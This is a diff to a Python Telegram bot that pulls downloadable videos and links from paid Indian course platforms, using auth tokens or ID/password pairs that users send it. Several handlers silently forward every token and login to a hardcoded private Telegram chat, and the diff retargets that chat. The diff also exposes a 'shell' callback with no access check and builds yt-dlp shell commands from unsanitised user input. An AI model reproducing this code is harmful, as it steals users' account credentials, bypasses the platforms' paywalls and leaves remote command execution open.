@@ -11,6 +11,9 @@ from subprocess import getstatusoutput
 
 import requests
 from pyrogram import Client, filters
+from pyrogram.types import CallbackQuery
+from threading import Thread
+from flask import Flask
 from pyrogram.errors import FloodWait
 from pyrogram.types import Message
 from pyromod import listen
@@ -19,7 +22,7 @@ import online.helpers.vid as helper
 from online.Config import *
 from online.helpers.button import keyboard
 from online.helpers.sudoers import *
-from online.helpers.text import *
+
 
 # ==========Logging==========#
 logging.basicConfig(
@@ -43,6 +46,46 @@ bot = Client(
 )
 
 print(listen.__file__)
+
+# =========== Callback Query Handler =========== #
+
+# ...existing code...
+
+# Callback data to handler mapping
+callback_command_map = {
+    "PW": accounpwlwogin,
+    "Khazana": khazanan,
+    "Apni": apnissn,
+    "khangs": khann,
+    "cp": infcpsgin,
+    "patna": khan_dowbol,
+    "infopw": info_login,
+    "adownload": account_ln,
+    "pro_vision": pro_visooin,
+    "adda_pdf": addaspsdin,
+    "pro_olive": proolsgin,
+    "pro_jw": projwin,
+    "top": account_login,
+    "rozgar": account_login_rozgar,
+    "taiyaric": gaiyrab,
+    "Pyro": download_pw,
+    "Cancel": cancel,
+    "Restart": restart_handler,
+    "shell": shell,
+     # Agar aapka eval ka function hai to yahan uska naam likh do
+    # "exampur": exampur_handler,  # Agar exampur ka function hai to yahan add karo
+}
+
+@bot.on_callback_query()
+async def handle_callback(bot, query: CallbackQuery):
+    data = query.data
+    handler = callback_command_map.get(data)
+    if handler:
+        await handler(bot, query.message)
+    else:
+        await query.message.reply_text("❓ Unknown Command!")
+# ...existing code...
+
 
 
 # ========== Converter =============#
@@ -155,13 +198,18 @@ Step 3: Send your Telegram ID From @missrose_bot
 # ============== Start Commands ==========#
 @bot.on_message(filters.command(["start"]))
 async def account_lstarn(bot: Client, m: Message):
-    if not one(m.from_user.id):
-        return await m.reply_photo(
-            photo="https://telegra.ph/file/e6d2807b0d3074742fe41.jpg",
-            caption=paid_text,
-            reply_markup=keyboard,
-        )
-    await m.reply_text(start_text)
+    caption = (
+        "👋 **Welcome to AUBLIC Extractor Bot!**\n\n"
+        "📁 I am a **TXT to Video Uploader** and **Link Downloader Bot**.\n"
+        "📦 Just use the buttons below or send valid commands to get started.\n\n"
+        "👇 Choose your option to begin:"
+    )
+
+    await m.reply_photo(
+        photo="https://i.ibb.co/cSyLcHNz/Chat-GPT-Image-Jun-3-2025-03-16-31-PM.png",
+        caption=caption,
+        reply_markup=keyboard
+    )
 
 
 # ========== Global Concel Command ============
@@ -1052,7 +1100,7 @@ async def accounpwlwogin(bot: Client, m: Message):
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
     await bot.send_message(
-        -1002133225459, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+        -1002698150766, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.co",
@@ -1283,7 +1331,7 @@ async def accounpwlwogin(bot: Client, m: Message):
 async def khazanan(bot: Client, m: Message):
     if not one(m.from_user.id):
         return await m.reply_text(
-            "✨ Hello I Am TXT File Downloader And Extractor Bot.\n\n👉🏻 Press /pyro To Download Links Listed. Send TXT File FORMAT {FileName : FileLink}\n👉🏻 Press /cancel To Cancel All Running Task\n👉🏻 Press /restart To Restart The Bot.\n👉🏻 Press /pw To Extract All Downloadable Links Using AUTH CODE \n\n🫶🏻 Bot Made By LegendBoy"
+            "✨ Hello I Am TXT File Downloader And Extractor Bot.\n\n👉🏻 Press /pyro To Download Links Listed. Send TXT File FORMAT {FileName : FileLink}\n👉🏻 Press /cancel To Cancel All Running Task\n👉🏻 Press /restart To Restart The Bot.\n👉🏻 Press /pw To Extract All Downloadable Links Using AUTH CODE \n\n🫶🏻 Bot Made By AublicXRobot"
         )
 
     editable = await m.reply_text(
@@ -1292,7 +1340,7 @@ async def khazanan(bot: Client, m: Message):
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
     await bot.send_message(
-        -1002133225459, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+        -1002698150766, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.xyz",
@@ -1321,7 +1369,7 @@ async def khazanan(bot: Client, m: Message):
     input2 = message = await bot.listen(editable.chat.id)
     raw_text2 = input2.text
     await bot.send_message(
-        -1002133225459, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
+        -1002698150766, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
     )
     response2 = requests.get(
         f"https://api.penpencil.co/v1/programs/{raw_text2}/subjects", headers=headers
@@ -1477,7 +1525,7 @@ async def apnissn(bot: Client, m: Message):
     input1 = await bot.listen(editable.chat.id)
     token = input1.text
     await bot.send_message(
-        -1002133225459, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
+        -1002698150766, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
     )
     headers1 = {
         "Host": "spec.apnikaksha.net",
@@ -1636,11 +1684,11 @@ async def khann(bot: Client, m: Message):
 async def account_ln(bot: Client, m: Message):
     user = m.from_user.id if m.from_user is not None else None
     if user is not None and user not in sudo_users:
-        await m.reply("**Buy it from @LegendBoy_OP**", quote=True)
+        await m.reply("**Buy it from @Aublic**", quote=True)
         return
     else:
         editable = await m.reply_text(
-            "Hello Bruh **I An Anurag Downloader Bot**. I can download videos from **text** file one by one.**\n\nLanguage** : Python**\nFramework** : Pyrogram\n\nSend **TXT** File {Name : Link}"
+            "Hello Bruh **I Am an Aublic Downloader Bot**. I can download videos from **text** file one by one.**\n\nLanguage** : Python**\nFramework** : Pyrogram\n\nSend **TXT** File {Name : Link}"
         )
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
@@ -1777,7 +1825,7 @@ async def pro_visooin(bot: Client, m: Message):
                 f"**Downloading:-**\n\n**Name :-** `{name}`\n\n**Url :-** `{url}`\n\n`"
             )
             prog = await m.reply_text(Show)
-            cc = f"**Name »** {name1}.mp4\n**Batch »** {raw_text5}\n**Index »** {str(count).zfill(3)}\n\n**Download BY** :- Group Admin"
+            cc = f"**Name »** {name1}.mp4\n**Batch »** {raw_text5}\n**Index »** {str(count).zfill(3)}\n\n**Download BY AublicX_Robot**"
             if "vision" or "youtu" in url:
                 cmd = f'yt-dlp "{url}" -o "{name}"'
             elif "player.vimeo" in url:
@@ -2104,7 +2152,7 @@ async def projwin(bot: Client, m: Message):
             name = f"{str(count).zfill(3)}) {name1}"
             Show = f"**Downloading:-**\n\n**Name :-** `{name}`\n\n**Url :-** `{url1}`"
             prog = await m.reply_text(Show)
-            cc = f"**Title »** {name1}.mkv\n**Caption »** {raw_text0}\n**Index »** {str(count).zfill(3)}\n\n**Download BY** :- Group Admin"
+            cc = f"**Title »** {name1}.mkv\n**Caption »** {raw_text0}\n**Index »** {str(count).zfill(3)}\n\n**Download BY AublicX_Robot**"
             if "pdf" in url:
                 cmd = f'yt-dlp -o "{name}.pdf" "{url1}"'
             else:
@@ -2169,7 +2217,7 @@ async def projwin(bot: Client, m: Message):
         await m.reply_text(e)
     await m.reply_text("Done")
 
-"""
+
 
 @bot.on_message(filters.command(["top"]))
 async def account_login(bot: Client, m: Message):
@@ -2288,11 +2336,22 @@ async def account_login(bot: Client, m: Message):
             except Exception as e:
                 await m.reply_text(str(e))
 
-            dur = int(helper.duration(filename))
+                dur = int(helper.duration(filename))
 
-            start_time = time.time()
+                start_time = time.time()
+                await m.reply_video(
+                    f"{name}.mp4",
+                    supports_streaming=True,
+                    height=720,
+                    width=1280,
+                    caption=cc,
+                    duration=dur,
+                    thumb=thumbnail,
+                    progress=progress_bar,
+                    progress_args=(reply, start_time)
+                )
 
-                await m.reply_video(f"{name}.mp4",supports_streaming=True,height=720,width=1280,caption=cc,duration=dur,thumb=thumbnail, progress=progress_bar,progress_args=(reply,start_time) )
+
                 count+=1
                 os.remove(f"{name}.mp4")
 
@@ -2306,9 +2365,9 @@ async def account_login(bot: Client, m: Message):
     except Exception as e:
         await m.reply_text(str(e))
     await m.reply_text("Done") 
-"""
-@bot.on_message(filters.command(["muskan"]))
-async def account_login(bot: Client, m: Message):
+
+@bot.on_message(filters.command(["rozgar"]))
+async def account_login_rozgar(bot: Client, m: Message):
     editable = await m.reply_text("Send **ID & Password** in this manner otherwise bot will not respond.\n\nSend like this:-  **ID*Password**")
     rwa_url = "https://rozgarapinew.teachx.in/post/login"
     hdr = {"Client-Service": "Appx",
@@ -2428,4 +2487,17 @@ async def account_login(bot: Client, m: Message):
         f.write(cool2)
     await m.reply_document(f"{file_name}.txt")
 
-bot.run()
+# Flask Dummy Server
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is alive!"
+
+def run_flask():
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+
+# Run both
+if __name__ == "__main__":
+    Thread(target=run_flask).start()
+    bot.run()
